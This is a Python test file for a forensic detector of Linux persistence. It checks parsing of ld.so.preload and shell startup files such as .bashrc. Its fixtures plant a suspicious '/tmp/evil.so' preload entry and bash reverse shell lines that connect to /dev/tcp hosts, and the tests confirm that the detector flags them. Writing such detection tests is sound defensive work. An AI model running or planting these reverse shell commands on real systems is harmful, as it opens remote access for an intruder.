"""Tests for Linux shell artifact parser (ld.so.preload and shell-init files)."""

from __future__ import annotations

from pathlib import Path

from sift_find_evil.detectors.linux_persistence import LinuxPersistenceDetector
from sift_find_evil.parsers.linux_shell import parse_ld_preload, parse_shell_init


def test_parse_ld_preload_malicious(tmp_path: Path) -> None:
    """Test ld.so.preload with a suspicious shared object in /tmp."""
    etc_dir = tmp_path / "etc"
    etc_dir.mkdir()
    preload_file = etc_dir / "ld.so.preload"
    preload_file.write_text("/tmp/evil.so\n")

    result = parse_ld_preload(tmp_path)
    assert result == "/tmp/evil.so\n"

    # Feed through detector - should find the malicious .so
    detector = LinuxPersistenceDetector()
    findings = detector.analyze({"ld_preload": result})
    assert len(findings) == 1
    assert findings[0].title == "Dynamic linker hijack via /etc/ld.so.preload"
    assert "/tmp/evil.so" in findings[0].evidence["matched"]


def test_parse_ld_preload_empty(tmp_path: Path) -> None:
    """Test missing or empty ld.so.preload returns empty string."""
    # Missing file
    result = parse_ld_preload(tmp_path)
    assert result == ""

    # Empty file
    etc_dir = tmp_path / "etc"
    etc_dir.mkdir()
    preload_file = etc_dir / "ld.so.preload"
    preload_file.write_text("")

    result = parse_ld_preload(tmp_path)
    assert result == ""

    # Both should yield no findings
    detector = LinuxPersistenceDetector()
    findings = detector.analyze({"ld_preload": result})
    assert len(findings) == 0


def test_parse_ld_preload_benign_mutation(tmp_path: Path) -> None:
    """Test ld.so.preload with standard library path yields no finding."""
    etc_dir = tmp_path / "etc"
    etc_dir.mkdir()
    preload_file = etc_dir / "ld.so.preload"
    # Move .so to standard library path
    preload_file.write_text("/usr/lib/x86_64-linux-gnu/libc_malloc_debug.so.0\n")

    result = parse_ld_preload(tmp_path)
    assert result == "/usr/lib/x86_64-linux-gnu/libc_malloc_debug.so.0\n"

    # Should yield no findings (standard lib path)
    detector = LinuxPersistenceDetector()
    findings = detector.analyze({"ld_preload": result})
    assert len(findings) == 0


def test_parse_shell_init_reverse_shell(tmp_path: Path) -> None:
    """Test shell init file with a reverse shell command."""
    home_dir = tmp_path / "home" / "alice"
    home_dir.mkdir(parents=True)
    bashrc = home_dir / ".bashrc"
    bashrc.write_text(
        """# Comment line
export PATH=/usr/local/bin:$PATH
bash -i >& /dev/tcp/10.0.0.5/4444 0>&1
"""
    )

    result = parse_shell_init(tmp_path)

    # Should have 2 entries (comment skipped)
    assert len(result) == 2

    # Find the reverse shell entry
    reverse_shell_entry = [e for e in result if "bash -i" in e["line"]]
    assert len(reverse_shell_entry) == 1
    assert reverse_shell_entry[0]["path"] == "/home/alice/.bashrc"
    assert "bash -i >& /dev/tcp/10.0.0.5/4444 0>&1" in reverse_shell_entry[0]["line"]

    # Find the benign export entry
    export_entry = [e for e in result if "export PATH" in e["line"]]
    assert len(export_entry) == 1
    assert export_entry[0]["path"] == "/home/alice/.bashrc"

    # Feed through detector - should find only the reverse shell
    detector = LinuxPersistenceDetector()
    findings = detector.analyze({"bashrc_entries": result})
    assert len(findings) == 1
    assert findings[0].title == "Malicious shell-init entry in /home/alice/.bashrc"
    assert "bash -i" in findings[0].evidence["matched"]
    assert "interactive bash reverse shell" in findings[0].evidence["reason"]


def test_parse_shell_init_mutation_benign(tmp_path: Path) -> None:
    """Test shell init with only benign commands yields no findings."""
    home_dir = tmp_path / "home" / "alice"
    home_dir.mkdir(parents=True)
    bashrc = home_dir / ".bashrc"
    # Change reverse shell to benign command
    bashrc.write_text(
        """# Comment line
export PATH=/usr/local/bin:$PATH
echo "Welcome to the system"
"""
    )

    result = parse_shell_init(tmp_path)

    # Should have 2 entries (comment skipped)
    assert len(result) == 2

    # Feed through detector - should find nothing
    detector = LinuxPersistenceDetector()
    findings = detector.analyze({"bashrc_entries": result})
    assert len(findings) == 0


def test_parse_shell_init_multiple_locations(tmp_path: Path) -> None:
    """Test shell init parser covers multiple locations."""
    # System-wide /etc/profile
    etc_dir = tmp_path / "etc"
    etc_dir.mkdir()
    profile = etc_dir / "profile"
    profile.write_text("export SYSTEM=true\n")

    # System-wide /etc/bash.bashrc
    bash_bashrc = etc_dir / "bash.bashrc"
    bash_bashrc.write_text("export BASHRC=true\n")

    # /etc/profile.d/*.sh
    profile_d = etc_dir / "profile.d"
    profile_d.mkdir()
    custom_sh = profile_d / "custom.sh"
    custom_sh.write_text("export CUSTOM=true\n")

    # /root/.bashrc
    root_dir = tmp_path / "root"
    root_dir.mkdir()
    root_bashrc = root_dir / ".bashrc"
    root_bashrc.write_text("export ROOT_BASHRC=true\n")

    # /root/.profile
    root_profile = root_dir / ".profile"
    root_profile.write_text("export ROOT_PROFILE=true\n")

    # /home/alice/.bashrc
    alice_dir = tmp_path / "home" / "alice"
    alice_dir.mkdir(parents=True)
    alice_bashrc = alice_dir / ".bashrc"
    alice_bashrc.write_text("export ALICE=true\n")

    # /home/alice/.zshrc
    alice_zshrc = alice_dir / ".zshrc"
    alice_zshrc.write_text("export ALICE_ZSH=true\n")

    # /home/bob/.bash_profile
    bob_dir = tmp_path / "home" / "bob"
    bob_dir.mkdir(parents=True)
    bob_bash_profile = bob_dir / ".bash_profile"
    bob_bash_profile.write_text("export BOB=true\n")

    result = parse_shell_init(tmp_path)

    # Should have 8 entries total
    assert len(result) == 8

    # Verify paths are in-image absolute (stripped root prefix)
    paths = {entry["path"] for entry in result}
    assert "/etc/profile" in paths
    assert "/etc/bash.bashrc" in paths
    assert "/etc/profile.d/custom.sh" in paths
    assert "/root/.bashrc" in paths
    assert "/root/.profile" in paths
    assert "/home/alice/.bashrc" in paths
    assert "/home/alice/.zshrc" in paths
    assert "/home/bob/.bash_profile" in paths


def test_parse_shell_init_skip_blank_lines(tmp_path: Path) -> None:
    """Test that blank lines are skipped."""
    home_dir = tmp_path / "home" / "alice"
    home_dir.mkdir(parents=True)
    bashrc = home_dir / ".bashrc"
    bashrc.write_text(
        """

export VAR=value

# comment

"""
    )

    result = parse_shell_init(tmp_path)

    # Should have only 1 entry (export line; blanks and comment skipped)
    assert len(result) == 1
    assert result[0]["line"] == "export VAR=value"


def test_shell_symlink_escape_is_contained(tmp_path: Path) -> None:
    """A .bashrc symlink pointing outside the mounted root must not be read."""
    import os

    root = tmp_path / "mnt"
    (root / "home" / "alice").mkdir(parents=True)
    secret = tmp_path / "host_bashrc"
    secret.write_text("bash -i >& /dev/tcp/9.9.9.9/9 0>&1\n")
    os.symlink(secret, root / "home" / "alice" / ".bashrc")

    entries = parse_shell_init(root)

    assert all("dev/tcp" not in e["line"] for e in entries)
